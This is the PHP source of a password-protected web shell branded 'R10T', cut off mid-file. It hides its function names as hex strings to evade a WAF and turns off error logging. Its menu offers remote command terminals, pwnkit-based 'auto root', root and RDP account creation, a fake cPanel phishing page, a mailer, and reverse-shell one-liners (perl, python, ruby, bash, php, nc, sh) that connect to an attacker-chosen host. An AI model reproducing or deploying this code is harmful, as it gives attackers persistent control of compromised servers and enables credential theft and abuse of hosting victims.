<?php
session_start();
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

/* konfigurasi */
/* Password using md5 hashes */
$password = "6fec6b83b1fec8a924e7222124cf6e75";
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';
date_default_timezone_set("Asia/Jakarta");
function login_shell()
{
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: monospace
            }

            input[type=password] {
                border: none;
                border-bottom: 1px solid #000;
                padding: 2px
            }

            input[type=password]:focus {
                outline: 0
            }

            input[type=submit] {
                border: none;
                padding: 4.5px 20px;
                background-color: #010d40;
                color: #ddcf02
            }
        </style>
    </head>

    <body>
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
            </div>
        </form>
    </body>

    </html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
# function WAF

$Array = [
    '676574637764', # ge  tcw d => 0
    '676c6f62', # gl ob => 1
    '69735f646972', # is_d ir => 2
    '69735f66696c65', # is_ file => 3
    '69735f7772697461626c65', # is_wr iteable => 4
    '69735f7265616461626c65', # is_re adble => 5
    '66696c657065726d73', # fileper ms => 6
    '66696c65', # f ile => 7
    '7068705f756e616d65', # php_unam e => 8
    '6765745f63757272656e745f75736572', # getc urrentuser => 9
    '68746d6c7370656369616c6368617273', # html special => 10
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
    '6d6b646972', # mk dir => 12
    '746f756368', # to uch => 13
    '6368646972', # ch dir => 14
    '72656e616d65', # ren ame => 15
    '65786563', # exe c => 16
    '7061737374687275', # pas sthru => 17
    '73797374656d', # syst em => 18
    '7368656c6c5f65786563', # sh ell_exec => 19
    '706f70656e', # p open => 20
    '70636c6f7365', # pcl ose => 21
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
    '70726f635f6f70656e', # p roc_open => 23
    '756e6c696e6b', # un link => 24
    '726d646972', # rmd ir => 25
    '666f70656e', # fop en => 26
    '66636c6f7365', # fcl ose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
    '63686d6f64', # ch mod => 30
    '7379735f6765745f74656d705f646972', # temp _dir => 31
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if ($_GET['don'] == true) {
    $FilesDon = download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>R10T [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        .btn-submit,
        a {
            text-decoration: none;
            color: #ddcf02
        }

        a,
        body {
            color: #ddcf02
        }

        .btn-submit,
        .form-file,
        tbody tr:nth-child(2n) {
            background-color: #31009d
        }

        .code-editor,
        .modal,
        .terminal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0
        }

        .code-editor-body textarea,
        .terminal-body textarea {
            width: 98.5%;
            height: 400px;
            font-size: smaller;
            resize: none
        }

        .menu-tools li,
        .terminal-body li,
        .terminal-head li {
            display: inline-block
        }

        body {
            background-color: #000e28;
            font-family: monospace
        }

        .btn-modal-close:hover,
        .btn-submit:hover,
        .menu-file-manager ul,
        .path-pwd,
        thead {
            background-color: #010d40
        }

        ul {
            list-style: none
        }

        .menu-header li {
            padding: 5px 0
        }

        .menu-header ul li {
            font-weight: 700;
            font-style: italic
        }

        .btn-submit {
            padding: 5px 10px;
            border: 2px solid grey;
            border-radius: 10px
        }

        .form-file,
        a:hover {
            color: #c5c8d6
        }

        .btn-submit:hover {
            border: 2px solid #c5c8d6
        }

        .form-upload {
            margin: 10px 0
        }

        .form-file {
            border: 2px solid grey;
            padding: 7px 20px;
            border-radius: 4px
        }

        .menu-tools {
            width: 95%
        }

        .menu-tools li {
            margin: 15px 0
        }

        .menu-file-manager,
        .modal-mail-text {
            margin: 10px 40px
        }

        .menu-file-manager li {
            display: inline-block;
            margin: 15px 20px
        }

        .menu-file-manager li a::after {
            content: "";
            display: block;
            border-bottom: 1px solid #ddcf02
        }

        .path-pwd {
            padding: 15px 0;
            margin: 5px 0
        }

        table {
            border-radius: 5px
        }

        thead {
            height: 35px
        }

        tbody tr td {
            padding: 10px 0
        }

        tbody tr td:nth-child(2),
        tbody tr td:nth-child(3),
        tbody tr td:nth-child(4) {
            text-align: center
        }

        ::-webkit-scrollbar {
            width: 16px
        }

        ::-webkit-scrollbar-track {
            background: #000e28
        }

        ::-webkit-scrollbar-thumb {
            background: #750000;
            border: 2px solid #555;
            border-radius: 4px
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #555
        }

        ::-webkit-file-upload-button {
            display: none
        }

        .modal {
            display: none;
            z-index: 2;
            width: 100%;
            background-color: rgba(0, 0, 0, .3)
        }

        .modal-container {
            animation-name: modal-pop-out;
            animation-duration: .7s;
            animation-fill-mode: both;
            margin: 10% auto auto;
            border-radius: 10px;
            width: 800px;
            background-color: #f4f4f9
        }

        @keyframes modal-pop-out {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        .modal-header {
            color: #000;
            margin-left: 30px;
            padding: 10px
        }

        .modal-body,
        .terminal-head li {
            color: #000
        }

        .modal-create-input {
            width: 700px;
            padding: 10px 5px;
            background-color: #f4f4f9;
            margin: 0 5%;
            border: none;
            border-radius: 4px;
            box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
            border-bottom: 2px solid #000e28
        }

        .box-shadow {
            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
        }

        .btn-modal-close {
            background-color: #750000;
            color: #ddcf02;
            border: none;
            border-radius: 4px;
            padding: 8px 35px
        }

        .badge-action-chmod:hover::after,
        .badge-action-download:hover::after,
        .badge-action-editor:hover::after {
            padding: 5px;
            border-radius: 5px;
            margin-left: 110px;
            background-color: #010d40
        }

        .modal-btn-form {
            margin: 15px 0;
            padding: 10px;
            text-align: right
        }

        .file-size {
            color: orange
        }

        .badge-root::after {
            content: "root";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            border-radius: 4px;
            background-color: red
        }

        .badge-action-chmod:hover::after,
        .badge-action-download:hover::after,
        .badge-action-editor:hover::after,
        .badge-linux::after,
        .badge-windows::after {
            width: 60px;
            text-align: center;
            margin-top: -30px;
            display: block;
            position: absolute
        }

        .badge-windows::after {
            background-color: orange;
            color: #000;
            margin-left: 100px;
            border-radius: 4px;
            content: "windows"
        }

        .badge-linux::after {
            margin-left: 100px;
            border-radius: 4px;
            background-color: #0047a3;
            content: "linux"
        }

        .badge-action-editor:hover::after {
            content: "Rename"
        }

        .badge-action-chmod:hover::after {
            content: "Chmod"
        }

        .badge-action-download:hover::after {
            content: "Download"
        }

        .code-editor,
        .terminal {
            background-color: rgba(0, 0, 0, .3);
            width: 100%
        }

        .code-editor-container {
            background-color: #f4f4f9;
            color: #000;
            width: 95%;
            margin: 40px auto auto;
            border-radius: 10px
        }

        .code-editor-head {
            padding: 15px;
            font-weight: 700
        }

        .code-editor-body textarea {
            border-radius: 4px;
            margin: 0 4px;
            background-color: #750000;
            color: #ddcf02
        }

        .terminal-container {
            animation: .5s both modal-pop-out;
            width: 90%;
            background-color: #f4f4f9;
            margin: 25px auto auto;
            color: #000;
            border-radius: 4px
        }

        .bc-R10T,
        .mail,
        .terminal-input {
            background-color: #000e28;
            color: #ddcf02
        }

        .terminal-head {
            padding: 8px
        }

        .terminal-head li a {
            color: #000;
            position: absolute;
            right: 0;
            margin-right: 110px;
            font-weight: 700;
            margin-top: -20px;
            font-size: 25px;
            padding: 1px 10px
        }

        .terminal-body textarea {
            margin: 4px;
            background-color: #000e28;
            color: #29db12;
            border-radius: 4px
        }

        .active {
            display: block
        }

        .terminal-input {
            width: 500px;
            padding: 6px;
            border: 1px solid #000e28;
            border-radius: 4px;
            margin: 5px 0
        }

        .bc-R10T {
            border: none;
            padding: 7px 10px;
            width: 712px;
            border-radius: 5px;
            margin: 15px 40px
        }

        .mail {
            width: 705px;
            resize: none;
            height: 100px
        }

        .logo-R10T {
            position: absolute;
            top: -90px;
            right: 40px;
            z-index: -1;
            bottom: 0
        }
    </style>
</head>

<body>
    <div class="menu-header">
        <ul>
            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
            <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
            <li class="logo-R10T"><img width="400" height="400" src="https://iappleunlock.xyz/image/logobiru.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
            <li class="form-upload"><input type="submit" value="Upload" name="R10T-up-submit" class="btn-submit">&nbsp;<input type="file" name="R10T-upload"></li>
            </form>
        </ul>
    </div>
    <div class="menu-tools">
        <ul>
            <li><a href=" " class="btn-submit" id="create_folder">Create Folder</a></li>
            <li><a href=" " class="btn-submit" id="create_file">Create File</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit">Terminal</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit">AUTO ROOT [ROOT]</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit">Adminer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit">Backdoor Destroyer</a></li>
            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit">Linux Exploit</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit">Lock Shell</a></li>
            <li><a href="" class="btn-submit" id="lock-file">Lock File Linux</a></li>
            <li><a href="" class="btn-submit" id="root-user">Create User [ROOT]</a></li>
            <li><a href="" class="btn-submit" id="create-rdp">CREATE RDP</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit">PHP Mailer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&fakepage" class="btn-submit">FAKE PAGE</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit">BACKCONNECT</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=bypasser" class="btn-submit">TERMINAL BYPASSER</a></li>
            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit">HASH IDENTIFIER</a></li>
            <li><a href="" class="btn-submit" id="lock-windows">Lock File Windows</a></li>
            <li><a href="//github.com/MadExploits/" class="btn-submit">README</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&logout=True" class="btn-submit">LOGOUT!</a></li>
        </li>
    </div>

    <?php

    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cwd = $fungsi[0]();
    ?>

    <div class="menu-file-manager">
        <div class="path-pwd">
            <?php
            $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
            $pwd = explode("/", $cwd);
            if (stristr(PHP_OS, "WIN")) {
                windowsDriver();
            }
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '">' . $val . ' / ' . '</a>';
            }
            echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
            ?>
        </div>
        </ul>
        
        <table style="width: 100%;">
        
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            <form action="" method="post">
                <tbody>
                    <!-- R10T Folder File Manager -->
                    <?php foreach ($file_manager as $_D) : ?>
                        <?php if ($fungsi[2]($_D)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
                                <td>[ DIR ]</td>
                                <td>
                                    <?php if ($fungsi[4]($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="#00ff00">';
                                    } elseif (!$fungsi[5]($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="red">';
                                    }
                                    echo perms($fungsi[0]() . '/' . $_D);
                                    ?>
                                </td>
                                <!-- Action Folder Manager -->
                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- R10T Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="R10T-files"><?= namaPanjang($_F); ?></a></td>
                                <td><?= formatSize(filesize($_F)); ?></td>
                                <td>
                                    <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="#00ff00">';
                                    } elseif (!is_readable($fungsi[0]() . '/' . $_F)) {
                                        echo '<font color="red">';
                                    }
                                    echo perms($fungsi[0]() . '/' . $_F);
                                    ?>
                                </td>
                                <!-- Action File Manager -->
                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </tbody>
        </table>
        <br>
        <select name="R10T-select" class="btn-submit">
            <option value="delete">Delete</option>
            <option value="unzip">Unzip</option>
            <option value="zip">Zip</option><br>
        </select>
        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 5px 20px;">
        </form>


        <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
        <div class="modal">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div id="modal-body-bc"></div>
                        <span id="modal-input"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
                        </div>
                </form>
            </div>
        </div>
    </div>
    </div>
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: Backconnect</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-R10T box-shadow" name="R10T-bc">
                            <option value="-">Choose Backconnect</option>
                            <option value="perl">Perl</option>
                            <option value="python">Python</option>
                            <option value="ruby">Ruby</option>
                            <option value="bash">Bash</option>
                            <option value="php">php</option>
                            <option value="nc">nc</option>
                            <option value="sh">sh</option>
                            <option value="xterm">Xterm</option>
                            <option value="golang">Golang</option>
                        </select>
                        <input type="text" name="backconnect-host" class="modal-create-input" placeholder="127.0.0.1">
                        <br><br>
                        <input type="number" name="backconnect-port" class="modal-create-input" placeholder="1337">
                        <div class="modal-btn-form">
                            <input type="submit" name="submit-bc" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['fakepage'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: fakepage</i></b></h3>
                </div>
                <form action="" method="post">
                        <input type="text" name="fakepage-tipe" class="modal-create-input" placeholder="cpanel/directadmin">
                        <br><br>
                        <input type="text" name="fakepage-clone" class="modal-create-input" placeholder="clone page">
                        <br><br>
                        <input type="text" name="fakepage-root" class="modal-create-input" placeholder="Fake page rooot">
                        <br><br>
                        <input type="text" name="fakepage-inejct" class="modal-create-input" placeholder="Inject to ">
                        <br><br>
                        <input type="text" name="fakepage-bind" class="modal-create-input" placeholder="Bind on ">
                        <br><br>
                        <input type="text" name="fakepage-log" class="modal-create-input" placeholder="Log To">
                        <br><br>
                        <input type="number" name="fakepage-count" class="modal-create-input" placeholder="Count of Invalid login ">
                        
                        <div class="modal-btn-form">
                            <input type="submit" name="submit-fakepage'" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['mailer'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: PHP Mailer</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                <div class="modal-mail-text">
                                    <textarea name="message-smtp" class="box-shadow mail" placeholder="&nbsp;Your Text here!"></textarea>
                                </div>
                                <br>
                                <input type="text" name="mailto-subject" class="modal-create-input" placeholder="Subject">
                                <br><br>
                                <input type="email" name="mail-from-smtp" class="modal-create-input" placeholder="from : example@mail.com">
                                <br><br>
                                <input type="email" name="mail-to-smtp" class="modal-create-input" placeholder="to : example@mail.com">
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['f']) : ?>
        <div class="code-editor">
            <div class="code-editor-container">
                <div class="code-editor-head">
                    <h3><i class="fa-solid fa-code"></i>&nbsp; Code Editor : <?= unx($_GET['f']); ?></h3>
                </div>
                <div class="code-editor-body">
                    <form action="" method="post">
                        <textarea name="code-editor" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                        <div class="modal-btn-form">
                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "normal") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea class="box-shadow" disabled><?php
                                                            if (isset($_POST['terminal'])) {
                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
                                                            }
                                                            ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "bypasser") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea class="box-shadow" disabled><?php
                                                            if ($fungsi[3]('.term-bypass')) {
                                                                include(".term-bypass");
                                                                if (isset($_POST['terminal-bypass-submit'])) {
                                                                    echo $fungsi[10](pwn($_POST['terminal-bypass'] . " 2>&1"));
                                                                }
                                                            }
                                                            ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="terminal-bypass" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="terminal-bypass-submit" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
                                                    $response = $fungsi[11]('.mad-root');
                                                    $r_text = explode(" ", $response);
                                                    if ($r_text[0] == "uid=0(root)") {
                                                        if (isset($_POST['submit-root'])) {
                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
                                                        }
                                                    } else {
                                                        echo "This Device Is Not Vulnerable\n";
                                                        echo cmd('lsb_release -a') . "\n";
                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
                                                    }
                                                } else {
                                                    $fungsi[24]('.mad-root');
                                                } ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['re'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Rename : <?= unx($_GET['re']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['ch'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Change Permission : <?= unx($_GET['ch']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
    <script>
        $(document).ready(function() {
            $('#create_folder').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
                event.preventDefault();
            });
            $('#create_file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
                event.preventDefault();
            });
            $('#lock-file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
                event.preventDefault();
            });
            $('#lock-windows').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE WINDOWS');
                $('#modal-input').html('<input type="text" name="lock-windows" class="modal-create-input" placeholder="Your File Name">');
                event.preventDefault();
            });
            $('#root-user').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
                event.preventDefault();
            });

            $('#create-rdp').click(function() {
                $('.modal').show();
                $('#modal-title').html(':: CREATE RDP');
                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
                event.preventDefault();
            });

            $('#close-modal').click(function() {
                $('.modal').hide();
                event.preventDefault();
            });
            $('#close-editor').click(function() {
                $('.code-editor').hide();
                event.preventDefault();
            });

            $('.close-terminal').click(function() {
                $('.terminal').hide();
                event.preventDefault();
            });
            $('.close-btn-s').click(function() {
                $('.modal').hide();
                event.preventDefault();
            });
        });
    </script>
</body>

</html>
<?php

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['R10T-bc'] == "perl") {
        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
    } else if ($_POST['R10T-bc'] == "python") {
        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($_POST['R10T-bc'] == "ruby") {
        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($_POST['R10T-bc'] == "bash") {
        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['R10T-bc'] == "php") {
        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');exec("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($_POST['R10T-bc'] == "nc") {
        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } else if ($_POST['R10T-bc'] == "sh") {
        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['R10T-bc'] == "xterm") {
        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } else if ($_POST['R10T-bc'] == "golang") {
